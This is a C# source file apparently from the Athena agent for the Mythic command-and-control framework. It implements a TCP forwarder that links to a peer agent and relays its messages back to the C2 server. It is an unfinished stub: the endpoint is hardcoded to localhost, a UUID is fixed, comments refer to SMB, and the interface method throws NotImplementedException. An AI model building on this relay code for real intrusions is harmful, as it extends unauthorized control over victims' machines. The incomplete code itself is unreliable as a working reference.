using Athena.Commands;
using Athena.Models.Config;
using Athena.Models.Mythic.Response;
using Athena.Models.Mythic.Tasks;
using Athena.Utilities;
using ServiceWire.TcpIp;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Net;
using System.Text;
using System.Text.Json;
using Athena.Profiles.Forwarders.Models;
using Athena.Models.ResponseResults;

namespace Athena.Forwarders
{
    public class Forwarder : IForwarder
    {
        public bool connected { get; set; }
        private IPEndPoint clientEndpoint { get; set; }
        private ServiceWire.TcpIp.TcpClient<ITcpMessenger> client { get; set; }
        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
        private CancellationTokenSource cts { get; set; }

        public string profile_type => "tcp";

        public Forwarder()
        {
        }

        //Link to the Athena SMB Agent
        public async Task<bool> Link(MythicJob job, string uuid)
        {
            Console.WriteLine("Linking endpoint.");
            Dictionary<string, string> par = JsonSerializer.Deserialize<Dictionary<string, string>>(job.task.parameters);
            try
            {
                //this.clientEndpoint = new IPEndPoint(IPAddress.Parse(par["host"]), int.Parse(par["port"]));
                this.clientEndpoint = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 8080);
                this.client = new TcpClient<ITcpMessenger>(clientEndpoint);
                this.cts = new CancellationTokenSource();
                MessageLoop();
            }
            catch(Exception e)
            {
                Console.WriteLine(e);
            }

            return true;
        }
        public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
        {
            ServiceWire.TcpIp.TcpClient<ITcpMessenger> client = new TcpClient<ITcpMessenger>(clientEndpoint);
            Console.WriteLine("Forwarding Message.");
            return client.Proxy.ForwardMessage(dm.message);
        }
        private async Task MessageLoop()
        {
            Console.WriteLine("Starting Message Loop.");
            while (!this.cts.IsCancellationRequested)
            {
                string msg = await this.client.Proxy.GetMessage();

                if(string.IsNullOrEmpty(msg))
                {
                    continue;
                }
                Console.WriteLine("Got Message.");
                await DelegateResponseHandler.AddDelegateMessageAsync(new DelegateMessage
                {
                    message = msg,
                    c2_profile = "smb",
                    uuid = "61e0e58e-5baf-4245-97e0-7e20e3e6f795"
                });

                await Task.Delay(10000);
            }
        }
        //Unlink from the named pipe
        public async Task<bool> Unlink()
        {
            try
            {
                this.cts.Cancel();
                return true;
            }
            catch (Exception e)
            {
                return false;
            }
        }

        Task<EdgeResponseResult> IForwarder.Link(MythicJob job, string uuid)
        {
            throw new NotImplementedException();
        }
    }
    class SmbMessage
    {
        public string uuid;
        public string message;
        public int chunks;
        public int chunk;
    }
}
